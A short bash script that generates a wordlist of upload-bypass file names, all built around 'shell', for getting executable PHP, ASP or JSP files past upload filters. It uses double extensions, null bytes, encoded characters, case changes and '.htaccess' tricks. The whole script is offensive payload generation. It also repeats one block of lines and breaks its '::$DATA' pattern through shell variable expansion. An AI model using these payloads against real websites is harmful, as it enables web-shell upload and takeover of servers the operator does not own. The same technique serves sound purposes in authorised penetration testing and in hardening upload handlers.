#!/bin/bash

# Clear existing wordlist
> wordlist.txt

# Add more dangerous extensions
extensions=(
    # PHP variants
    '.php' '.phps' '.phar' '.phtml' '.php3' '.php4' '.php5' '.php7' '.php8'
    '.php.gz' '.php.inc' '.php.test' '.php.txt'
    
    # Engine-specific
    '.asp' '.aspx' '.jsp' '.jspx' '.cfm' '.action'
    
    # Server configs
    '.htaccess' '.htpasswd' '.user.ini'
    
    # Double extensions
    '.jpg.php' '.png.php' '.gif.php'
    '.php.jpg' '.php.png' '.php.gif'
    
    # Null byte tricks (URL-encoded)
    '.php%00.jpg' '.php%00.png'
    '.php\x00.jpg' '.php\0.jpg'
    
    # Case variations
    '.PHP' '.Php' '.pHp' '.pHP'
    
    # Special characters
    '.php.' '.php..' '.php ' '.php%20'
    '.php:' '.php;' '.php|' '.php%0a'
    
    # Archive formats
    '.zip' '.tar.gz' '.rar' # If file extraction is possible
    
    # Template files
    '.tpl' '.twig' '.blade.php'
    
    # Less common
    '.shtml' '.pht' '.pgif' '.phpt'
)

# Special characters to test
chars=('%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' '%3B' '%26' '%23')

# Generate all combinations
for char in "${chars[@]}"; do
    for ext in "${extensions[@]}"; do
        # Basic patterns
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
        
        
        
	echo "shell$char$ext.jpeg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
        
        # Advanced patterns
        echo "shell$char$ext%00.jpg" >> wordlist.txt
        echo "shell$ext::$DATA.jpg" >> wordlist.txt
        echo "shell$ext%20" >> wordlist.txt
    done
done

# Add double extensions
for ext in "${extensions[@]}"; do
    echo "shell$ext.jpg" >> wordlist.txt
    echo "shell.jpg$ext" >> wordlist.txt
    echo "shell$ext.png" >> wordlist.txt
done

# Add case variations
echo "shell.PhP" >> wordlist.txt
echo "shell.pHp5" >> wordlist.txt

echo "Wordlist generated with $(wc -l wordlist.txt | awk '{print $1}') entries"
